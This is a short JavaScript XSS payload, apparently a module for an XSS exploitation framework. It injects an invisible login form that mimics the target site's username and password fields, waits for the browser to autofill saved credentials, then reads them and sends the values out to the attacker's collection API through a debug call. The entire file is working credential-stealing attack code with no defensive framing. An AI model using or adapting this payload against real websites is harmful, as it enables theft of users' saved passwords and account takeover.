// inject the form
function getLogin(uname, pname, loc) {
	xssappend("<form action='"+loc+"' method='post'><input type='text' name='"+uname+"' id='un54'><input type='password' name='"+pname+"' id='pw54'></form>");
	console.log("add form");
	window.setTimeout(saveLogin, 800);
}
// send the parameters back to the api via a debug call
function saveLogin() {
	var u = xssgbi('un54');
	var p = xssgbi('pw54');
	if (u.value && u.value.length > 1) { debug("found username: "+encodeURIComponent(u.value)+" password: "+encodeURIComponent(p.value)); }
	else { debug("login form injected, but no saved username was found"); } 
	xsscls();
}
var xssuname = xssopt("user_field", "the name attribute of the username field", "username");
var xsspname = xssopt("pass_field", "the name attribute of the username field", "password");
var xssloc = xssopt("form_action", "the location the form normally posts to", "/login"); 

debug("injecting form : " + xssuname + " / " + xsspname + " / " + xssloc);
getLogin(xssuname, xsspname, xssloc);
